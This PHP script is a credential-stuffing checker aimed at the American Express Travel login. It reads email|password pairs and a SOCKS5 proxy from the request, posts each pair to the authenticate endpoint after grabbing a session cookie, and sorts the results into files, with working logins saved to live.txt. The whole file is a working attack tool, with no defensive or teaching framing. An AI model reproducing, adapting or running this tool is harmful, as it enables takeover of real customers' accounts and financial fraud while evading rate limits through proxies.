<?php
// error_reporting(0);
require_once(__DIR__ . '/vendor/autoload.php');

use \Curl\Curl;

function save($type, $empas) {
  switch ($type) {
    case 'die':
      $file   = fopen('result/die.txt', 'a');
    break;
    case 'live':
      $file   = fopen('result/live.txt', 'a');
    break;
    case 'cant':
      $file   = fopen('result/timeout.txt', 'a');
    break;
    case '403':
      $file   = fopen('result/403.txt', 'a');
    break;
    default:
      $file   = fopen('result/unknown.txt', 'a');
    break;
  }

  fwrite($file, $empas . PHP_EOL);
  fclose($file);
}

$start = microtime(true);

$split      = explode('|', $_REQUEST['empas']);
$username   = (strpos($split[0], '@') === false) ? $split[0] : explode('@', $split[0])[0];
$password   = $split[1];
if (empty($_REQUEST['empas']) || empty($username) || empty($password)) { die('GAADA EMPAS TOLOL'); }

$curl   =  new Curl();

$curl->setOpt(CURLOPT_HTTPPROXYTUNNEL, TRUE);
$curl->setOpt(CURLOPT_PROXY, $_REQUEST['sock']);
$curl->setOpt(CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
$curl->setOpt(CURLOPT_TIMEOUT_MS, 20000);

$curl->setHeader('Host', 'travel.americanexpress.com');
$curl->setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36');

$grabPage   = $curl->post('https://travel.americanexpress.com/travel/partner/subNav/login', http_build_query([
  'TLTSID'          =>  '561078985078016757'.rand(1000, 9999).'75781853780',
  'requestSource'   =>  'https://www.amextravel.com/flight-searches'
]));

$curl->setHeader('X-Requested-With', 'XMLHttpRequest');
$curl->setHeader('Accept', 'application/json, text/javascript, */*; q=0.01');
$curl->setHeader('Content-Type', 'application/json');
$curl->setHeader('Cookie', $curl->responseHeaders['set-cookie']);

$postAmex   = $curl->post('https://travel.americanexpress.com/travel/partner/authenticate', '{"userId":"'.$username.'","password":"'.$password.'","requestSource":"https://www.amextravel.com/api/user?redirect=https%3A%2F%2Fwww.amextravel.com%2Ffeatured-hotel-searches","clientId":""}');

if (!$postAmex) {
  $result = [
    'status'  =>  'TIMEOUT',
    'empas'   =>  $username . '|' . $password,
    'sock'    =>  'Sock: ' . $_REQUEST['sock']
  ];

  save('cant', $username . '|' . $password);
} else if (isset($postAmex->errorBean->success) && $postAmex->errorBean->success === false) {

  $result = [
    'status'  =>  'DIE',
    'empas'   =>  $username . '|' . $password,
    'sock'    =>  'Sock: ' . $_REQUEST['sock']
  ];

  save('die', $username . '|' . $password);
} else if (isset($postAmex->errorBean->success) && $postAmex->errorBean->success === true) {

  $result = [
    'status'  =>  'LIVE',
    'empas'   =>  $username . '|' . $password,
    'sock'    =>  'Sock: ' . $_REQUEST['sock']
  ];

  save('live', $username . '|' . $password);
} else if ($postAmex === 'Forbidden') {

  $result = [
    'status'  =>  '403',
    'empas'   =>  $username . '|' . $password,
    'sock'    =>  'Sock: ' . $_REQUEST['sock']
  ];

  save('403', $username . '|' . $password);
} else {

  $result = [
    'status'  =>  $curl->getHttpStatusCode,
    'empas'   =>  $username . '|' . $password,
    'sock'    =>  'Sock: ' . $_REQUEST['sock']
  ];

  save('unknown', $username . '|' . $password);
}
$result['sec']  = (string) round((microtime(true) - $start)) . ' Sec';
die(json_encode($result));
